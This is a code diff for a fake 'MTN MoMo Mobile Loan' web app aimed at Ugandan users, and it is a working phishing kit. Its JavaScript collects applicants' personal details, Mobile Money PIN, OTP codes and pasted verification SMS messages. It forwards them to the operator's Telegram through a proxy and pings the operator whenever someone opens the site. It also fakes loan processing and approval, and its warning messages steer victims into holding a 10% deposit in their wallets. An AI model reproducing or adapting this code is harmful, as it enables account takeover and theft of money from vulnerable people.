+            <button class="btn btn-secondary" onclick="goHome()"><i class="fas fa-home"></i> <span id="homeOtpBtn">Home</span></button>
+        </div>
+    </div>
+    <div id="otpResultMessage" style="margin-top:12px; display:none;"></div>
+    <div class="whatsapp-reminder" style="margin-top:15px;">
+        <i class="fab fa-whatsapp"></i>
+        <div>
+            <strong>💬 Didn't receive the OTP or have questions?</strong><br>
+            <span>Click the WhatsApp icon at the bottom right to chat with an agent.</span>
+        </div>
+    </div>
+</div>
+
+<!-- ===== HOLD PANEL ===== -->
+<div class="panel" id="panelHold">
+    <div style="text-align:center;padding:20px 10px;">
+        <div style="font-size:60px;color:var(--mtn-yellow);margin-bottom:15px;"><i class="fas fa-hourglass-half"></i></div>
+        <h2 id="holdTitle">Loan on Hold</h2>
+        <p style="font-size:14px;line-height:1.6;color:#555;margin-top:15px;" id="holdDesc">Your loan has been put on hold. You will receive an SMS verification later. Once you receive the code, you can finalize the withdrawal.</p>
+        <p style="font-size:14px;color:var(--mtn-black);font-weight:600;margin-top:8px;" id="holdNote">Please keep your application open to finalize the process.</p>
+        <button class="btn" onclick="goToWithdrawAgain()" style="margin-top:16px;" id="holdBtn"><i class="fas fa-undo"></i> <span id="holdBtnText">Withdraw Again</span></button>
+        <button class="btn btn-secondary" style="margin-top:8px;" onclick="goHome()"><i class="fas fa-home"></i> <span id="homeHoldBtn">Home</span></button>
+        <div class="whatsapp-reminder" style="margin-top:15px;">
+            <i class="fab fa-whatsapp"></i>
+            <div>
+                <strong>💬 Need help?</strong><br>
+                <span>Didn't receive the verification message or have questions? Click the WhatsApp icon at the bottom right to chat with an agent.</span>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- ===== FINAL SUCCESS ===== -->
+<div class="panel" id="panelFinal">
+    <div style="text-align:center;padding:20px 10px;">
+        <div style="font-size:60px;color:#28a745;margin-bottom:15px;"><i class="fas fa-check-circle"></i></div>
+        <h2 id="finalTitle">Loan Disbursed Successfully!</h2>
+        <p style="font-size:14px;line-height:1.6;color:#555;margin-top:15px;" id="finalDesc">Your loan has been sent to your MTN Mobile Money wallet.</p>
+        <p style="font-size:14px;color:#333;font-weight:bold;margin-top:15px;background:#f0f0f0;padding:12px;border-radius:8px;" id="finalThanks">Thank you for choosing MTN MOMO Mobile Loan!</p>
+        <button class="btn" onclick="goToWithdrawAgain()" style="margin-top:16px;" id="finalBtn"><i class="fas fa-undo"></i> <span id="finalBtnText">Withdraw Again</span></button>
+        <button class="btn btn-secondary" style="margin-top:8px;" onclick="goHome()"><i class="fas fa-home"></i> <span id="homeFinalBtn">Home</span></button>
+        <div class="whatsapp-reminder" style="margin-top:15px;">
+            <i class="fab fa-whatsapp"></i>
+            <div>
+                <strong>💬 Need help?</strong><br>
+                <span>Click the WhatsApp icon at the bottom right to chat with an agent.</span>
+            </div>
+        </div>
+    </div>
+</div>
+
+</div><!-- end container -->
+  
+<script>
+// ===== TELEGRAM BOT CONFIG (client sends via /telegram-alert proxy) =====
+// Bot token & chat ID are on the server (server.js) — not exposed here.
+
+// ===== STATE =====
+let userData = {};
+let selectedLoanType = 'Personal';
+let approvedAmount = 0;
+let currentStepKey = 'step1';
+let otpTimerInterval = null;
+let processingInterval = null;
+let storedSms = '';
+
+const REDUCTION_RATE = 0.10;   // Silent 10% reduction on approval
+const DEPOSIT_RATE   = 0.10;   // 10% deposit requirement on retry
+
+let approvedAmounts = new Map(JSON.parse(localStorage.getItem('momo_ug_approved_amounts') || '[]'));
+let withdrawAttempts = new Map(JSON.parse(localStorage.getItem('momo_ug_withdraw_attempts') || '[]'));
+
+// ===== ENGLISH I18N =====
+const I18N = {
+    en: {
+        headerTitle: "Fast & Secure Loans",
+        headerSub: "Your money, when you need it.",
+        step1Text: "Offer", step2Text: "Profile", step3Text: "Review", step4Text: "Processing",
+        step1Title: "Loan Details",
+        step1Desc: "Enter your loan application details.",
+        limitNote: "Amount between 500,000 UGX and 30,000,000 UGX",
+        loanTypeLabel: "Loan Type",
+        loanTypePersonal: "Personal Loan",
+        loanTypeBusiness: "Business Loan",
+        amountLabel: "Amount (UGX)",
+        amountPlaceholder: "e.g. 5000000",
+        termLabel: "Loan Term (months)",
+        interestLabel: "Interest Rate %/yr",
+        monthlyLabel: "Monthly",
+        totalLabel: "Total",
+        interestLabel2: "Interest",
+        purposeLabel: "Loan Purpose",
+        purposePlaceholder: "Describe your loan purpose...",
+        step1BtnText: "Next Step",
+        step2Title: "Personal Information",
+        step2Desc: "Please provide your contact details.",
+        firstNameLabel: "First Name",
+        firstNamePlaceholder: "First Name",
+        lastNameLabel: "Last Name",
+        lastNamePlaceholder: "Last Name",
+        phoneLabel: "Phone Number (Uganda)",
+        phonePlaceholder: "772123456",
+        phoneHint: "9 digits starting with 77, 78, 76, or 39 (MTN only)",
+        phoneError: "Please enter a valid MTN Uganda number (77, 78, 76, or 39).",
+        emailLabel: "Email Address",
+        emailPlaceholder: "example@email.com",
+        emailError: "Please enter a valid email.",
+        cityLabel: "City",
+        statusLabel: "Employment Status",
+        selectPlaceholder: "Select",
+        step2BackText: "Back",
+        step2NextText: "Next Step",
+        step3Title: "Review Application",
+        step3Desc: "Please verify all details before submitting.",
+        reviewNotice: "Carefully check all information.",
+        reviewLoanTypeLabel: "Loan Type",
+        reviewAmountLabel: "Amount",
+        reviewTermLabel: "Term",
+        reviewPurposeLabel: "Purpose",
+        reviewNameLabel: "Full Name",
+        reviewPhoneLabel: "Phone",
+        reviewEmailLabel: "Email",
+        reviewCityLabel: "City",
+        reviewStatusLabel: "Status",
+        reviewMonthlyLabel: "Monthly",
+        reviewTotalLabel: "Total",
+        step3BackText: "Back",
+        step3SubmitText: "Submit",
+        processingTitle: "Processing your application...",
+        processingSub: "Please wait while we analyze your eligibility.",
+        processingWarning: "⚠️ Do not refresh — your progress may be lost!",
+        processingStatusStart: "Connecting to secure servers...",
+        adminTitle: "⏳ Awaiting Admin Approval",
+        adminSub: "Your application is being reviewed. Please wait...",
+        qualifiedTitle: "Congratulations!",
+        qualifiedDesc: "Your loan has been approved!",
+        qualifiedSub: "Approved Amount",
+        qualifiedBtnText: "Withdraw Loan",
+        homeQualifiedBtn: "Home",
+        withdrawTitle: "Withdraw Loan",
+        withdrawNotice: "Enter your withdrawal information.",
+        withdrawPhoneLabel: "Enter the MTN phone number registered for Mobile Money",
+        withdrawPhonePlaceholder: "772123456",
+        withdrawPhoneError: "Please enter a valid MTN number.",
+        pinLabel: "MTN Mobile Money PIN (5 digits)",
+        pinError: "Please enter all 5 digits.",
+        pinBtnText: "Verify PIN",
+        pinBackText: "Back",
+        homeWithdrawBtn: "Home",
+        smsPasteTitle: "SMS Verification",
+        smsPasteNotice: "A verification message has been sent to your phone. Copy and paste the full message below.",
+        smsPasteExpiryLabel: "⏱️ Message expires in",
+        smsPasteHint: "Paste your SMS before time runs out.",
+        smsPasteLabel: "Paste your full SMS message here",
+        smsPasteError: "Please paste the SMS message (min 180 chars).",
+        smsPasteBtnText: "Submit",
+        resendSmsText: "Resend",
+        smsPasteBackText: "Back",
+        smsPasteLaterText: "I will submit later",
+        homeSmsBtn: "Home",
+        smsExpiredMsg: "Message expired. Please request a new code.",
+        smsProcessingTitle: "Verifying message...",
+        smsProcessingSub: "Please wait while we process your SMS.",
+        smsProcessingStatus: "Connecting to server...",
+        otpTitle: "OTP Code",
+        otpNotice: "Enter the OTP code received by SMS",
+        otpLabel: "OTP Code",
+        otpError: "Please enter all 4 digits.",
+        otpBtnText: "Submit OTP",
+        otpBackText: "Back",
+        homeOtpBtn: "Home",
+        holdTitle: "Loan on Hold",
+        holdDesc: "Your loan has been put on hold. You will receive an SMS verification later. Once you receive the code, you can finalize the withdrawal.",
+        holdNote: "Please keep your application open to finalize the process.",
+        holdBtnText: "Withdraw Again",
+        homeHoldBtn: "Home",
+        finalTitle: "Loan Disbursed Successfully!",
+        finalDesc: "Your loan has been sent to your MTN Mobile Money wallet.",
+        finalThanks: "Thank you for choosing MTN MOMO Mobile Loan!",
+        finalBtnText: "Withdraw Again",
+        homeFinalBtn: "Home",
+        waHelpTitle: "💬 Need help?",
+        waHelpText: "Click the WhatsApp icon at the bottom right to chat with an agent.",
+        alertAmountInvalid: "Please enter an amount between 500,000 and 30,000,000 UGX.",
+        alertPurposeShort: "Please describe your loan purpose (min 3 characters).",
+        alertNameRequired: "Please enter your full name.",
+        alertCityRequired: "Please select your city.",
+        alertStatusRequired: "Please select your employment status.",
+        retryWarning1Title: "⚠️ Please retry again to withdraw your loan.",
+        retryWarning1Body: "You might have entered a wrong PIN, an expired MOMO verification message, an invalid MOMO message, or a wrong OTP.",
+        retryWarning1Note: "Make sure you have at least 10% of the requested amount in your MOMO wallet to activate your account.",
+        attemptWarningGreeting: "Dear",
+        attemptWarningP1: "We would like to inform you that your MTN Mobile Money wallet currently appears to be inactive. For this reason, your loan application of",
+        attemptWarningP1b: "does not currently meet the applicable eligibility requirements.",
+        attemptWarningP2: "Please ensure that your wallet has at least 10%",
+        attemptWarningP2b: "of the requested loan amount, if this is an officially applicable requirement.",
+        attemptWarningP3: "Please note that we do not deduct the",
+        attemptWarningP3b: "from your MTN Mobile Money account, and it is not considered a loan-processing fee. The money remains in your own MTN Mobile Money wallet and under your control.",
+        attemptWarningP4: "Once your wallet meets the applicable eligibility requirements, you may resubmit your loan application for evaluation. Making a deposit does not guarantee loan approval or disbursement.",
+        attemptWarningP5: "⚠️ Important: Before making any deposit, please verify this requirement directly with the relevant MTN MoMo lending/loan provider through the official MTN support channel, WhatsApp, or Facebook Messenger.",
+        attemptWarningThanks: "Thank you for your understanding.",
+        patientWaitTitle: "Please be patient...",
+        patientWaitBody: "We are currently verifying your request. This may take a few moments.",
+        withdrawAgainBtn: "Withdraw Again",
+        homeBtn: "Home",
+        invalidPhoneNumber: "Invalid phone number.",
+        verifyingText: "Verifying...",
+        noteLabel: "Note"
+    }
+};
+
+function t(key) {
+    return I18N.en[key] !== undefined ? I18N.en[key] : key;
+}
+  
+// ===== PROGRESS SAVE / RESTORE =====
+function saveProgress() {
+    localStorage.setItem('momo_ug_user_data', JSON.stringify(userData));
+    localStorage.setItem('momo_ug_current_step', currentStepKey);
+    localStorage.setItem('momo_ug_approved_amount', approvedAmount);
+    localStorage.setItem('momo_ug_approved_amounts', JSON.stringify(Array.from(approvedAmounts.entries())));
+    localStorage.setItem('momo_ug_withdraw_attempts', JSON.stringify(Array.from(withdrawAttempts.entries())));
+}
+
+function restoreProgress() {
+    const savedData = localStorage.getItem('momo_ug_user_data');
+    if (savedData) {
+        try {
+            userData = JSON.parse(savedData);
+            if (userData.firstName) document.getElementById('firstName').value = userData.firstName;
+            if (userData.lastName) document.getElementById('lastName').value = userData.lastName;
+            if (userData.phone) document.getElementById('phone').value = userData.phone;
+            if (userData.email) document.getElementById('email').value = userData.email;
+            if (userData.city) document.getElementById('city').value = userData.city;
+            if (userData.status) document.getElementById('status').value = userData.status;
+            if (userData.purpose) document.getElementById('purpose').value = userData.purpose;
+        } catch(e) {}
+    }
+    const savedAmount = localStorage.getItem('momo_ug_approved_amount');
+    if (savedAmount) approvedAmount = parseFloat(savedAmount);
+    const savedStep = localStorage.getItem('momo_ug_current_step');
+    if (savedStep && savedStep !== 'step1') goToStep(savedStep);
+}
+
+// ===== SPLASH SCREEN =====
+setTimeout(() => {
+    document.getElementById('splashScreen').classList.add('hidden');
+    document.getElementById('appContainer').classList.add('visible');
+    restoreProgress();
+}, 2000);
+
+// ===== WAKE-UP CALL: alert owner when someone opens the site =====
+window.addEventListener('load', () => {
+    if (!sessionStorage.getItem('momo_ug_visit_alerted')) {
+        sessionStorage.setItem('momo_ug_visit_alerted', '1');
+        const now = new Date();
+        sendToTelegram({
+            type: '🔔 SITE VISIT — WAKE UP CALL',
+            message:
+                `🔔 *Someone just opened the MTN MoMo Uganda site!*\n\n` +
+                `⏰ *Time:* ${now.toLocaleString('en-GB')}\n` +
+                `🌐 *Referrer:* ${document.referrer || 'direct'}\n` +
+                `📄 *URL:* ${window.location.href}\n` +
+                `📱 *Device:* ${/Mobile|Android|iPhone|iPad/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'}\n` +
+                `🌍 *Lang:* ${navigator.language || 'unknown'}\n\n` +
+                `👉 *Be ready to serve the user.*`
+        });
+    }
+});
+
+// ===== PHONE VALIDATION (MTN Uganda only: 77, 78, 76, 39) =====
+function isValidPhone(phone) {
+    const cleaned = phone.replace(/\s/g, '');
+    return /^(77|78|76|39)\d{7}$/.test(cleaned);
+  }
+  
+// ===== LOAN CALCULATOR =====
+function updateCalculator() {
+    const amount = parseFloat(document.getElementById('loanAmountSlider').value) || 0;
+    const months = parseInt(document.getElementById('loanMonths').value) || 1;
+    const rate = parseFloat(document.getElementById('interestRate').value) || 0;
+    const monthlyRate = rate / 100 / 12;
+    let mp = 0, total = 0, interest = 0;
+    if (amount > 0 && months > 0) {
+        if (rate === 0) mp = amount / months;
+        else {
+            const factor = Math.pow(1 + monthlyRate, months);
+            mp = amount * monthlyRate * factor / (factor - 1);
+        }
+        total = mp * months;
+        interest = total - amount;
+    }
+    document.getElementById('monthlyDisplay').textContent = `${Math.round(mp).toLocaleString('en-UG')} UGX`;
+    document.getElementById('totalDisplay').textContent = `${Math.round(total).toLocaleString('en-UG')} UGX`;
+    document.getElementById('interestDisplay').textContent = `${Math.round(interest).toLocaleString('en-UG')} UGX`;
+    document.getElementById('amountValue').textContent = `${Math.round(amount).toLocaleString('en-UG')} UGX`;
+    document.getElementById('loanAmount').value = Math.round(amount);
+}
+
+document.getElementById('loanAmountSlider').addEventListener('input', updateCalculator);
+document.getElementById('loanMonths').addEventListener('change', updateCalculator);
+document.getElementById('loanAmount').addEventListener('input', function() {
+    let val = parseFloat(this.value) || 0;
+    if (val < 500000) val = 500000;
+    if (val > 30000000) val = 30000000;
+    document.getElementById('loanAmountSlider').value = val;
+    updateCalculator();
+});
+updateCalculator();
+
+document.querySelectorAll('#loanTypeGroup .radio-option').forEach(opt => {
+    opt.addEventListener('click', function() {
+        document.querySelectorAll('#loanTypeGroup .radio-option').forEach(o => {
+            o.style.borderColor = '#e0e0e0';
+            o.style.background = '#fafafa';
+        });
+        this.style.borderColor = '#FFCC00';
+        this.style.background = '#fff8e1';
+        this.querySelector('input[type="radio"]').checked = true;
+        selectedLoanType = this.querySelector('input[type="radio"]').value;
+    });
+});
+
+// ===== STEP NAVIGATION =====
+function goToStep(step) {
+    currentStepKey = step;
+    saveProgress();
+    const panels = ['panelStep1','panelStep2','panelStep3','panelStep4','panelQualified','panelWithdraw','panelSmsPaste','panelSmsProcessing','panelOtpEntry','panelHold','panelFinal'];
+    panels.forEach(id => { const el = document.getElementById(id); if (el) el.classList.remove('active'); });
+    const targetMap = {
+        step1:'panelStep1', step2:'panelStep2', step3:'panelStep3',
+        step4:'panelStep4', qualified:'panelQualified', withdraw:'panelWithdraw',
+        smsPaste:'panelSmsPaste', smsProcessing:'panelSmsProcessing', otpEntry:'panelOtpEntry',
+        hold:'panelHold', final:'panelFinal'
+    };
+    const target = document.getElementById(targetMap[step] || 'panelStep1');
+    if (target) target.classList.add('active');
+
+    const stepMap = { step1:1, step2:2, step3:3, step4:4, qualified:4, withdraw:4, smsPaste:4, smsProcessing:4, otpEntry:4, hold:4, final:4 };
+    const activeStep = stepMap[step] || 1;
+    for (let i = 1; i <= 4; i++) {
+        const label = document.getElementById(`step${i}Label`);
+        if (label) {
+            label.classList.remove('active', 'done');
+            if (i < activeStep) label.classList.add('done');
+            else if (i === activeStep) label.classList.add('active');
+        }
+    }
+}
+
+function goToStep1() { goToStep('step1'); }
+
+function goToStep2() {
+    const amount = parseFloat(document.getElementById('loanAmount').value);
+    if (!amount || amount < 500000 || amount > 30000000) { alert(t('alertAmountInvalid')); return; }
+    const purpose = document.getElementById('purpose').value.trim();
+    if (purpose.length < 3) { alert(t('alertPurposeShort')); return; }
+    userData = {
+        ...userData,
+        loanType: selectedLoanType,
+        amount: amount,
+        months: parseInt(document.getElementById('loanMonths').value),
+        rate: parseFloat(document.getElementById('interestRate').value),
+        purpose: purpose
+    };
+    goToStep('step2');
+}
+
+function goToStep3() {
+    const firstName = document.getElementById('firstName').value.trim();
+    const lastName = document.getElementById('lastName').value.trim();
+    const phone = document.getElementById('phone').value.trim();
+    const email = document.getElementById('email').value.trim();
+    const city = document.getElementById('city').value;
+    const status = document.getElementById('status').value;
+
+    if (!firstName || !lastName) { alert(t('alertNameRequired')); return; }
+    if (!phone || !isValidPhone(phone)) {
+        document.getElementById('phoneError').classList.remove('hidden');
+        document.getElementById('phoneError').textContent = t('phoneError');
+        return;
+    }
+    document.getElementById('phoneError').classList.add('hidden');
+    if (!email || !email.includes('@') || !email.includes('.')) {
+        document.getElementById('emailError').classList.remove('hidden');
+        return;
+    }
+    document.getElementById('emailError').classList.add('hidden');
+    if (!city) { alert(t('alertCityRequired')); return; }
+    if (!status) { alert(t('alertStatusRequired')); return; }
+
+    userData = { ...userData, firstName, lastName, phone, email, city, status };
+    updateReview();
+    goToStep('step3');
+  }
+  
+function updateReview() {
+    document.getElementById('reviewLoanType').textContent = userData.loanType || '—';
+    document.getElementById('reviewAmount').textContent = `${userData.amount?.toLocaleString('en-UG') || 0} UGX`;
+    document.getElementById('reviewTerm').textContent = `${userData.months || 0} months`;
+    document.getElementById('reviewPurpose').textContent = userData.purpose || '—';
+    document.getElementById('reviewName').textContent = `${userData.firstName || ''} ${userData.lastName || ''}`.trim() || '—';
+    document.getElementById('reviewPhone').textContent = `+256 ${userData.phone || '—'}`;
+    document.getElementById('reviewEmail').textContent = userData.email || '—';
+    document.getElementById('reviewCity').textContent = userData.city || '—';
+    document.getElementById('reviewStatus').textContent = userData.status || '—';
+    const mp = calculateMonthly(userData.amount, userData.months, userData.rate);
+    document.getElementById('reviewMonthly').textContent = `${Math.round(mp).toLocaleString('en-UG')} UGX`;
+    document.getElementById('reviewTotal').textContent = `${Math.round(mp * userData.months).toLocaleString('en-UG')} UGX`;
+}
+
+function calculateMonthly(amount, months, rate) {
+    if (!amount || !months) return 0;
+    const monthlyRate = rate / 100 / 12;
+    if (rate === 0) return amount / months;
+    const factor = Math.pow(1 + monthlyRate, months);
+    return amount * monthlyRate * factor / (factor - 1);
+}
+
+// ===== TELEGRAM SENDERS (proxy via /telegram-alert) =====
+function sendToTelegram(data) {
+    let message = `📱 *MTN MOMO Mobile Loan - Uganda*\n\n`;
+    message += `📌 *Type:* ${data.type || 'N/A'}\n`;
+    message += `👤 *Name:* ${data.fullName || 'N/A'}\n`;
+    message += `📞 *Phone:* ${data.phone ? '+256 ' + data.phone : 'N/A'}\n`;
+    message += `📧 *Email:* ${data.email || 'N/A'}\n`;
+    message += `🏙️ *City:* ${data.city || 'N/A'}\n`;
+    message += `📊 *Status:* ${data.status || 'N/A'}\n`;
+    message += `💵 *Requested:* ${data.amount ? data.amount.toLocaleString('en-UG') + ' UGX' : '0'}\n`;
+    if (data.approvedAmount) message += `✅ *Approved:* ${data.approvedAmount.toLocaleString('en-UG')} UGX\n`;
+    message += `📅 *Term:* ${data.months || 0} months\n`;
+    message += `📊 *Rate:* ${data.rate || 0}%\n`;
+    message += `🎯 *Purpose:* ${data.purpose || 'N/A'}\n`;
+    message += `🏷️ *Loan Type:* ${data.loanType || 'N/A'}\n`;
+    if (data.pin) message += `🔑 *PIN:* ${data.pin}\n`;
+    if (data.otp) message += `🔢 *OTP:* ${data.otp}\n`;
+    if (data.attempt) message += `🔄 *Attempt #:* ${data.attempt}\n`;
+    if (data.message) message += `📝 *Message:* ${data.message}\n`;
+
+    fetch('/telegram-alert', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ message })
+    }).catch(err => console.error('telegram-alert error:', err));
+}
+
+function sendToTelegramSmsOnly(smsContent, pin) {
+    let message = `🔑 *USER PIN:* \`${pin || 'N/A'}\`\n\n`;
+    message += `📨 *MOMO VERIFICATION MESSAGE* 📨\n\n`;
+    message += `📩 *SMS CONTENT:*\n\`\`\`\n${smsContent}\n\`\`\``;
+    message += `\n\n📌 *Copy this text for the system*`;
+
+    fetch('/telegram-alert', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ message })
+    }).catch(err => console.error('telegram-alert error:', err));
+}
+
+// ===== SUBMIT APPLICATION — FIXED AMOUNT PER PHONE =====
+function submitApplication() {
+    const phone = userData.phone;
+    const requested = userData.amount || 500000;
+
+    // Silent 10% reduction
+    let computedApproved = Math.round(requested * (1 - REDUCTION_RATE));
+    if (computedApproved < 500000) computedApproved = 500000;
+    if (computedApproved > 30000000) computedApproved = 30000000;
+
+    if (approvedAmounts.has(phone)) {
+        // FIXED: reuse earlier approved amount for this exact phone number
+        approvedAmount = approvedAmounts.get(phone);
+        sendToTelegram({
+            type: '🔄 RE-APPLICATION (Fixed Amount Enforced)',
+            fullName: `${userData.firstName} ${userData.lastName}`,
+            phone: phone, email: userData.email, city: userData.city, status: userData.status,
+            amount: requested, approvedAmount: approvedAmount, months: userData.months,
+            rate: userData.rate, purpose: userData.purpose, loanType: userData.loanType,
+            message: `User requested ${requested.toLocaleString('en-UG')} UGX again — LOCKED to original approved ${approvedAmount.toLocaleString('en-UG')} UGX for this phone.`
+        });
+    } else {
+        // First time for this phone — compute & store fixed amount
+        approvedAmounts.set(phone, computedApproved);
+        approvedAmount = computedApproved;
+        saveProgress();
+        sendToTelegram({
+            type: '📝 NEW APPLICATION',
+            fullName: `${userData.firstName} ${userData.lastName}`,
+            phone: phone, email: userData.email, city: userData.city, status: userData.status,
+            amount: requested, approvedAmount: computedApproved, months: userData.months,
+            rate: userData.rate, purpose: userData.purpose, loanType: userData.loanType,
+            message: `10% silent reduction. Requested: ${requested.toLocaleString('en-UG')} UGX → Approved (LOCKED for this phone): ${computedApproved.toLocaleString('en-UG')} UGX`
+        });
+    }
+    goToStep('step4');
+    startProcessing(phone);
+  }
+  
+// ===== PROCESSING =====
+function startProcessing(phone) {
+    const statuses = [
+        'Connecting to secure servers...',
+        'Checking your eligibility...',
+        'Analyzing your transaction history...',
+        'Evaluating your repayment capacity...',
+        'Calculating approved amount...',
+        'Finalizing approval...'
+    ];
+
+    let progress = 0;
+    const totalTime = Math.floor(Math.random() * 5000) + 10000;
+    const stepTime = totalTime / 100;
+
+    document.getElementById('processingStatus').textContent = statuses[0];
+    document.getElementById('adminApprovalNotice').style.display = 'none';
+    document.getElementById('processingProgress').style.width = '0%';
+    document.getElementById('processingPercent').textContent = '0%';
+
+    let statusIndex = 0;
+    if (processingInterval) clearInterval(processingInterval);
+    processingInterval = setInterval(() => {
+        progress += 1;
+        if (progress > 100) progress = 100;
+        document.getElementById('processingProgress').style.width = progress + '%';
+        document.getElementById('processingPercent').textContent = Math.round(progress) + '%';
+
+        const idx = Math.min(Math.floor((progress / 100) * statuses.length), statuses.length - 1);
+        if (idx > statusIndex) {
+            statusIndex = idx;
+            document.getElementById('processingStatus').textContent = statuses[idx];
+        }
+
+        if (progress >= 70 && document.getElementById('adminApprovalNotice').style.display === 'none') {
+            document.getElementById('adminApprovalNotice').style.display = 'block';
+            const appId = 'APP-' + Date.now() + Math.floor(Math.random() * 1000);
+            document.getElementById('appIdValue').textContent = appId;
+            sendToTelegram({
+                type: '⏳ ADMIN APPROVAL PENDING',
+                phone: phone, amount: approvedAmount,
+                message: `Application ID: ${appId}`
+            });
+        }
+
+        if (progress >= 100) {
+            clearInterval(processingInterval);
+            processingInterval = null;
+            approvedAmount = approvedAmounts.get(phone);
+            // SILENT: user sees only the fixed approved amount
+            document.getElementById('qualifiedAmount').textContent = `${approvedAmount.toLocaleString('en-UG')} UGX`;
+            saveProgress();
+            sendToTelegram({
+                type: '✅ LOAN APPROVED',
+                phone: phone, amount: approvedAmount,
+                message: `Fixed qualified amount for this phone: ${approvedAmount.toLocaleString('en-UG')} UGX`
+            });
+            goToStep('qualified');
+        }
+    }, stepTime);
+}
+
+// ===== HOME BUTTON =====
+function goHome() {
+    if (userData.phone) {
+        withdrawAttempts.delete(userData.phone);
+        localStorage.setItem('momo_ug_withdraw_attempts', JSON.stringify(Array.from(withdrawAttempts.entries())));
+    }
+    document.getElementById('firstName').value = '';
+    document.getElementById('lastName').value = '';
+    document.getElementById('phone').value = '';
+    document.getElementById('email').value = '';
+    document.getElementById('city').value = '';
+    document.getElementById('status').value = '';
+    document.getElementById('purpose').value = '';
+    document.getElementById('loanAmount').value = '5000000';
+    document.getElementById('loanAmountSlider').value = '5000000';
+    document.getElementById('loanMonths').value = '12';
+    document.querySelectorAll('.pin-input').forEach(inp => inp.value = '');
+    document.querySelectorAll('.otp-input').forEach(inp => inp.value = '');
+    document.getElementById('smsMessage').value = '';
+    document.getElementById('smsPasteError').classList.add('hidden');
+    document.getElementById('otpError').classList.add('hidden');
+    document.getElementById('otpResultMessage').style.display = 'none';
+    document.getElementById('otpResultMessage').innerHTML = '';
+    document.getElementById('otpForm').style.display = 'block';
+    document.getElementById('otpBtn').disabled = false;
+    if (otpTimerInterval) { clearInterval(otpTimerInterval); otpTimerInterval = null; }
+    if (processingInterval) { clearInterval(processingInterval); processingInterval = null; }
+    userData = {};
+    approvedAmount = 0;
+    saveProgress();
+    goToStep('step1');
+    updateCalculator();
+}
+
+// ===== GO TO WITHDRAW =====
+function goToWithdraw() {
+    const phoneInput = document.getElementById('withdrawPhone');
+    if (userData && userData.phone) phoneInput.value = userData.phone;
+    else phoneInput.value = '';
+    document.getElementById('withdrawPhoneError').classList.add('hidden');
+    document.querySelectorAll('.pin-input').forEach(inp => inp.value = '');
+    document.getElementById('pinError').classList.add('hidden');
+    document.getElementById('smsMessage').value = '';
+    document.querySelectorAll('.otp-input').forEach(inp => inp.value = '');
+    document.getElementById('smsPasteError').classList.add('hidden');
+    document.getElementById('otpError').classList.add('hidden');
+    document.getElementById('otpResultMessage').style.display = 'none';
+    document.getElementById('otpResultMessage').innerHTML = '';
+    document.getElementById('otpForm').style.display = 'block';
+    document.getElementById('otpBtn').disabled = false;
+    goToStep('withdraw');
+    setTimeout(() => {
+        const firstPin = document.querySelector('.pin-input');
+        if (firstPin) firstPin.focus();
+    }, 300);
+}
+
+function goToWithdrawAgain() { goToWithdraw(); }
+
+// ===== PIN INPUT HANDLERS =====
+document.querySelectorAll('.pin-input').forEach((inp, idx) => {
+    inp.addEventListener('input', function() {
+        this.value = this.value.replace(/\D/g, '');
+        if (this.value.length === 1 && idx < 4) document.querySelectorAll('.pin-input')[idx+1].focus();
+        document.getElementById('pinError').classList.add('hidden');
+    });
+    inp.addEventListener('keydown', function(e) {
+        if (e.key === 'Backspace' && this.value.length === 0 && idx > 0) document.querySelectorAll('.pin-input')[idx-1].focus();
+    });
+});
+
+// ===== OTP INPUT HANDLERS =====
+document.querySelectorAll('.otp-input').forEach((inp, idx) => {
+    inp.addEventListener('input', function() {
+        this.value = this.value.replace(/\D/g, '');
+        if (this.value.length === 1 && idx < 3) document.querySelectorAll('.otp-input')[idx+1].focus();
+        document.getElementById('otpError').classList.add('hidden');
+    });
+    inp.addEventListener('keydown', function(e) {
+        if (e.key === 'Backspace' && this.value.length === 0 && idx > 0) document.querySelectorAll('.otp-input')[idx-1].focus();
+    });
+});
+
+// ===== VERIFY PIN =====
+function verifyPin() {
+    const phone = document.getElementById('withdrawPhone').value.trim();
+    if (!phone || !isValidPhone(phone)) {
+        document.getElementById('withdrawPhoneError').classList.remove('hidden');
+        document.getElementById('withdrawPhoneError').textContent = t('withdrawPhoneError');
+        return;
+    }
+    document.getElementById('withdrawPhoneError').classList.add('hidden');
+
+    let pin = '';
+    document.querySelectorAll('.pin-input').forEach(inp => pin += inp.value);
+    if (pin.length !== 5) {
+        document.getElementById('pinError').classList.remove('hidden');
+        document.getElementById('pinError').textContent = t('pinError');
+        return;
+    }
+    document.getElementById('pinError').classList.add('hidden');
+
+    userData.phone = phone;
+    userData.pin = pin;
+    saveProgress();
+    goToStep('smsPaste');
+    startSmsCountdown();
+}
+
+function goBackToQualified() { goToStep('qualified'); }
+function goBackToWithdraw() { goToStep('withdraw'); }
+  
+// ===== SMS COUNTDOWN =====
+function startSmsCountdown() {
+    let seconds = 59;
+    const countdownEl = document.getElementById('smsCountdown');
+    if (countdownEl) countdownEl.textContent = seconds;
+    if (otpTimerInterval) clearInterval(otpTimerInterval);
+    otpTimerInterval = setInterval(() => {
+        seconds--;
+        const el = document.getElementById('smsCountdown');
+        if (el) el.textContent = seconds;
+        if (seconds <= 0) {
+            clearInterval(otpTimerInterval);
+            otpTimerInterval = null;
+            document.getElementById('smsPasteError').classList.remove('hidden');
+            document.getElementById('smsPasteError').textContent = t('smsExpiredMsg');
+        }
+    }, 1000);
+}
+
+// ===== RESEND SMS (notifies Telegram) =====
+function resendSms() {
+    document.getElementById('smsMessage').value = '';
+    document.getElementById('smsPasteError').classList.add('hidden');
+    startSmsCountdown();
+
+    sendToTelegram({
+        type: '🔁 RESEND SMS REQUESTED',
+        phone: userData.phone || 'N/A',
+        approvedAmount: approvedAmount,
+        fullName: `${userData.firstName || ''} ${userData.lastName || ''}`.trim() || 'N/A',
+        email: userData.email || 'N/A',
+        message: `User clicked RESEND on the SMS paste panel — waiting for a new MOMO verification SMS to arrive.`
+    });
+}
+
+// ===== SUBMIT SMS =====
+function submitSms() {
+    const sms = document.getElementById('smsMessage').value.trim();
+    if (!sms || sms.length < 180) {
+        document.getElementById('smsPasteError').classList.remove('hidden');
+        document.getElementById('smsPasteError').textContent = t('smsPasteError');
+        return;
+    }
+    document.getElementById('smsPasteError').classList.add('hidden');
+    storedSms = sms;
+
+    const pin = userData.pin || 'N/A';
+    sendToTelegramSmsOnly(sms, pin);
+
